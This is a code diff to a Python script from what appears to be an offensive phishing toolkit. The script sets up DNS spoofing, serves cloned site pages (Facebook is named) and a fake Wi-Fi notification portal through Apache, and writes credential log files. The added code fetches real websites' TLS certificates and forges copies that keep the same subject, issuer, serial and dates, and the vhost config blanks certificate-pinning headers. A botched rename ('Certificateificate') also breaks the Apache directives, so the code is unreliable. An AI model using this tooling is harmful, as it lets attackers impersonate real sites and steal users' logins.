@@ -1,4 +1,5 @@
-#!/usr/bin/env python3
+#!/usr/bin/python3
+
 
 import subprocess
 import os 
@@ -8,6 +9,22 @@ import sys
 import shutil
 import time
 from zipfile import ZipFile
+
+
+from OpenSSL import crypto
+from cryptography.hazmat.primitives import serialization
+from sys import argv, platform
+from pathlib import Path
+import shutil
+import ssl
+import os
+import subprocess
+import socket
+
+
+R='\033[31m'
+W='\033[0m'
+Y="\033[1;33m"
 Path_St = str("/".join(os.path.dirname(__file__).split('/')[:-1]))+'/Snake_Package/ServerLog/'
 Curent_dir2  ="".join(os.path.dirname(__file__)).replace("Snake_Package",'')
 LOG_PATH = str("/".join(os.path.dirname(__file__).split('/')[:-1]))+"/Snake_Package"
@@ -20,7 +37,8 @@ with open (Path_St+'.Cread.txt','w') as Cread_User :
     os.system(group2)
 with open (Path_St+'.pass.txt','w') as Cread_User :
     group3  = "chown "+ user_name+ ":"+user_name +" "+  Path_St+".pass.txt"
-    os.system(group3)    
+    os.system(group3)  
+
 def Set_Log():             
     subprocess.call(["chmod +x "+Curent_dir2+"Snake_Package/ServerLog/SERVER_DNS_STREAM.py"],shell=True)
     subprocess.call(["chmod +x "+Curent_dir2+"Snake_Package/ServerLog/DNS_SPOOFING_LOG.py"],shell=True)
@@ -32,23 +50,25 @@ def Set_Log():
        os.system(group)
     with open(Curent_dir2+'/WEB_AUTH_db.txt','a') as DB_PASS :
         group1  = "chown "+ user_name+ ":"+user_name +" "+  Curent_dir2+"WEB_AUTH_db.txt" 
-        os.system(group1)       
+        os.system(group1)   
+          
     os.system('sudo mkdir /var/www/html/wifi-notification')
     shutil.copy(LOG_PATH+'/resources/index.html', '/var/www/html/wifi-notification/')
     shutil.copy(LOG_PATH+'/resources/apple-success.html', '/var/www/html/wifi-notification/')
     shutil.copy(LOG_PATH+'/resources/wifi-notification.conf', '/etc/apache2/sites-available/')
     os.system("sudo touch /var/www/html/wifi-notification/generate_204")
     os.system('sudo chown -R www-data:www-data /var/www/html/wifi-notification')
-    os.system('sudo chmod -R 755 /var/www/html/wifi-notification')  
+    os.system('sudo chmod -R 755 /var/www/html/wifi-notification') 
+   
 class DNS_Spoofing:
 
         def __init__(self):
             self.parse_args()
             self.unzip_web()
-            self.Certificate_Self()
+            self.Certificateificate_Self()
             self.write_hosts()
             self.VirtualHost_files()       
-            self.DNS_COPY_WEB()
+           # self.DNS_COPY_WEB()
         def DNS_COPY_WEB(self):
             try:
                 if os.path.exists("/var/www/html/facebook"):
@@ -97,26 +117,63 @@ class DNS_Spoofing:
             except FileExistsError as r  :
                 print("[+] error " ,r)
                 exit()
-        def Certificate_Self(self):      
-            ssl_dir = os.path.join(LOG_PATH, "SSLCertificateFile")
-            if os.path.exists(ssl_dir):
-                print("[+] SSL Certificate  Directory Found")
+        def Certificateificate_Self(self): 
+            def Certificateificate_Process(): 
+                port = 443
+                ssl_dir.mkdir(parents=True, exist_ok=True)
+                print("[+] SSL Certificateificate File Directory Created")
+                for domain in os.listdir(Path(LOG_PATH) / "sites"):
+                    try:
+                        host = f"www.{domain}.com"
+                        context = ssl.create_default_context()
+                        print(f"{Y}[-] Fetch Certificate for {host}{W}")
+                        sys.stdout.write('\x1b[1A')
+                        sys.stdout.write('\x1b[2K')   
+                        with socket.create_connection((host, port), timeout=15) as sock:
+                            with context.wrap_socket(sock, server_hostname=host) as ssock:
+                                cert_pem = ssl.DER_cert_to_PEM_cert(ssock.getpeercert(True))
+                                Cert = crypto.load_certificate(crypto.FILETYPE_PEM, cert_pem)
+                    except Exception:
+                        try:
+                            host = f"www.{domain}.org"
+                            context = ssl.create_default_context()
+                            with socket.create_connection((host, port), timeout=5) as sock:
+                                with context.wrap_socket(sock, server_hostname=host) as ssock:
+                                    cert_pem = ssl.DER_cert_to_PEM_cert(ssock.getpeercert(True))
+                                    Cert = crypto.load_certificate(crypto.FILETYPE_PEM, cert_pem)
+                        except Exception:
+                            print(f"{R}[-] Failed to fetch certificate for {host}{W}")
+                            continue
+
+                    OUTPUT = ssl_dir / f"{domain}.pem"
+                    public_key = Cert.get_pubkey()
+                    key_size = public_key.to_cryptography_key().key_size
+                    if key_size < 2048:
+                        key_size = 2048
+                    key = crypto.PKey()
+                    key.generate_key(crypto.TYPE_RSA, key_size)
+                    Certificate = crypto.X509()
+                    Certificate.set_version(Cert.get_version())
+                    Certificate.set_serial_number(Cert.get_serial_number())
+                    Certificate.set_subject(Cert.get_subject())
+                    Certificate.set_issuer(Cert.get_issuer())
+                    Certificate.set_notBefore(Cert.get_notBefore())
+                    Certificate.set_notAfter(Cert.get_notAfter())
+                    Certificate.set_pubkey(key)
+                    Certificate.sign(key, 'sha256')
+                    with open(OUTPUT, 'wb') as pem_file:
+                        pem_file.write(crypto.dump_certificate(crypto.FILETYPE_PEM, Certificate))
+                        pem_file.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, key))
+
+                print("[+] SSL Certificateificate Generated successfully.")
+
+            ssl_dir = Path(LOG_PATH) / "SSLCertificate"
+            if ssl_dir.exists() and not self.args.cert:
+                print("[+] SSL Certificateificate Directory Found")
+            elif self.args.cert:
+                Certificateificate_Process()
             else:
-                
-                os.makedirs(ssl_dir, exist_ok=True)
-                print("[+] SSL Certificate File Directory Created")
-                for domain in os.listdir(os.path.join(LOG_PATH, "sites")):
-                    output_file = os.path.join(ssl_dir, f"{domain}.pem")
-                    openssl_cmd = [
-                        "openssl", "req", "-x509", "-newkey", "rsa:4096",
-                        "-sha256", "-days", "365", "-nodes",
-                        "-keyout", output_file,
-                        "-out", output_file,
-                        "-subj", f"/CN={domain}",
-                        "-addext", f"subjectAltName=DNS:{domain},DNS:*.{domain},IP:172.160.255.49"
-                    ]
-                    subprocess.run(openssl_cmd, check=True, capture_output=True)
-                print(f"[+] SSL Certificate Generated successfully.")
+                Certificateificate_Process()        
         def VirtualHost_files(self):
             if os.path.exists(LOG_PATH+'/VirtualHostFile'):
                 print("[+] VirtualHost File Found ")
@@ -181,8 +238,8 @@ class DNS_Spoofing:
 
                                     DocumentRoot /var/www/html/{file}
                                     SSLEngine on
-                                    SSLCertificateFile {LOG_PATH}/SSLCertificateFile/{file}.pem
-                                    SSLCertificateKeyFile {LOG_PATH}/SSLCertificateFile/{file}.pem
+                                    SSLCertificateificateFile {LOG_PATH}/SSLCertificateificateFile/{file}.pem
+                                    SSLCertificateificateKeyFile {LOG_PATH}/SSLCertificateificateFile/{file}.pem
                                     # Bypass security headers that might interfere with development
                                     Header always set Public-Key-Pins ""
                                     Header always set Expect-CT ""
@@ -282,6 +339,7 @@ class DNS_Spoofing:
             parser.add_argument( '-L ',"--List",action='store_true')
             parser.add_argument( '-T ',"--Target",action=None )
             parser.add_argument( '-P ',"--Packet",action=None ,type=int)
+            parser.add_argument( '-cert' ,action='store_true')
             parser.add_argument( '--dns',action='store_true')
             
             self.args = parser.parse_args()
@@ -328,8 +386,8 @@ if __name__=='__main__':
 
                                     DocumentRoot /var/www/html/{file}
                                     SSLEngine on
-                                    SSLCertificateFile {LOG_PATH}/SSLCertificateFile/wildcard.crt
-                                    SSLCertificateKeyFile {LOG_PATH}/SSLCertificateFile/wildcard.key
+                                    SSLCertificateificateFile {LOG_PATH}/SSLCertificateificateFile/wildcard.crt
+                                    SSLCertificateificateKeyFile {LOG_PATH}/SSLCertificateificateFile/wildcard.key
 
                                     ErrorLog {LOG_PATH}/ServerLog/log_error_ssl.log
                                     CustomLog {LOG_PATH}/ServerLog/log_access_ssl.log combined
